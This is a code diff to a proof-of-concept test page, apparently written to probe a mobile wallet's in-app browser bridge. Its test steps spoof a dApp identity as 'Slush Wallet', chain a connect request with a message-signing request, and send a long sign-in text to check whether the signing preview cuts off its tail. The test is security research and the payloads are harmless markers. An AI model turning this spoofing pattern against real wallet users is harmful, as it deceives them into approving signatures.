@@ -26,18 +26,42 @@ host application's embedded browser. Nothing here is a real dApp.</p>
   log('origin=' + location.origin);
   log('bridge=' + (!!(window.ReactNativeWebView && window.ReactNativeWebView.postMessage)));
   var seq = 1;
+  var pending = {};
   function emit(path, method, input) {
-    var id = seq++;
-    var payload = { eventName: '@trpc/request', data: { id: id, method: method, params: { path: path, input: input } } };
-    log('EMIT ' + JSON.stringify(payload));
-    window.ReactNativeWebView.postMessage(JSON.stringify(payload));
+    return new Promise(function (resolve, reject) {
+      var id = seq++;
+      pending[id] = { resolve: resolve, reject: reject, path: path };
+      var payload = { eventName: '@trpc/request', data: { id: id, method: method, params: { path: path, input: input } } };
+      log('EMIT ' + JSON.stringify(payload));
+      window.ReactNativeWebView.postMessage(JSON.stringify(payload));
+    });
   }
   window.addEventListener('message', function (e) {
-    try { log('RESP ' + JSON.stringify(JSON.parse(e.data))); }
-    catch (err) { log('RAW ' + String(e.data).slice(0, 300)); }
+    try {
+      var msg = JSON.parse(e.data);
+      log('RESP ' + JSON.stringify(msg));
+      var d = msg && msg.data;
+      if (msg && msg.eventName === '@trpc/response' && d && pending[d.id]) {
+        var p = pending[d.id]; delete pending[d.id];
+        if (d.error) p.reject(new Error(JSON.stringify(d.error)));
+        else p.resolve(d.result);
+      }
+    } catch (err) { log('RAW ' + String(e.data).slice(0, 300)); }
   });
-  var step = new URLSearchParams(location.search).get('step') || 'none';
+  function b64(s) { return btoa(s); }
+  var q = new URLSearchParams(location.search);
+  var step = q.get('step') || 'none';
+  var addrParam = q.get('addr') || '';
   log('step=' + step);
+  function firstAddress(result) {
+    try {
+      var data = result && result.data;
+      if (Array.isArray(data) && data.length && data[0].address) return data[0].address;
+      if (data && data.accounts && data.accounts.length) return data.accounts[0].address;
+      if (data && data.address) return data.address;
+    } catch (e) {}
+    return '';
+  }
   setTimeout(function () {
     if (step === 'connect') {
       emit('connect', 'query', { silent: false });
@@ -46,27 +70,35 @@ host application's embedded browser. Nothing here is a real dApp.</p>
     } else if (step === 'spoof') {
       emit('connect', 'query', {
         silent: false,
-        appName: 'Slush Wallet',
-        appDomain: 'slush.app',
-        appURL: 'https://slush.app',
-        appIconURL: 'https://slush.app/icon.png',
-        title: 'Slush Wallet',
-        url: 'https://slush.app',
-        origin: 'https://slush.app',
-        dappName: 'Slush Wallet',
-        dappUrl: 'https://slush.app',
-        host: 'slush.app'
+        appName: 'Slush Wallet', appDomain: 'slush.app', appURL: 'https://slush.app',
+        appIconURL: 'https://slush.app/icon.png', title: 'Slush Wallet',
+        url: 'https://slush.app', origin: 'https://slush.app',
+        dappName: 'Slush Wallet', dappUrl: 'https://slush.app', host: 'slush.app'
       });
     } else if (step === 'sign') {
       emit('signPersonalMessage', 'mutation', {
-        message: btoa('OSA-PoC-signature-request'),
-        account: { address: new URLSearchParams(location.search).get('addr') || '' }
+        message: b64('OSA-PoC-signature-request'),
+        account: { address: addrParam }
       });
     } else if (step === 'signlong') {
       emit('signPersonalMessage', 'mutation', {
-        message: btoa('Please sign in to continue. This message is long enough that a truncated preview could hide the tail. OSA-TAIL-MARKER-9f3c'),
-        account: { address: new URLSearchParams(location.search).get('addr') || '' }
+        message: b64('Please sign in to continue. This message is long enough that a truncated preview could hide the tail. OSA-TAIL-MARKER-9f3c'),
+        account: { address: addrParam }
       });
+    } else if (step === 'connectsign' || step === 'connectsignlong') {
+      emit('connect', 'query', { silent: false }).then(function (result) {
+        var addr = firstAddress(result) || addrParam;
+        log('addr=' + addr);
+        var msg = step === 'connectsign'
+          ? 'OSA-PoC-signature-request'
+          : 'Please sign in to continue. This message is long enough that a truncated preview could hide the tail. OSA-TAIL-MARKER-9f3c';
+        return emit('signPersonalMessage', 'mutation', {
+          message: b64(msg),
+          account: { address: addr },
+          appName: 'Slush Wallet', appDomain: 'slush.app'
+        });
+      }).then(function (r) { log('SIGNED ' + JSON.stringify(r)); })
+        .catch(function (e) { log('ERRSTEP ' + e.message); });
     }
   }, 900);
 })();
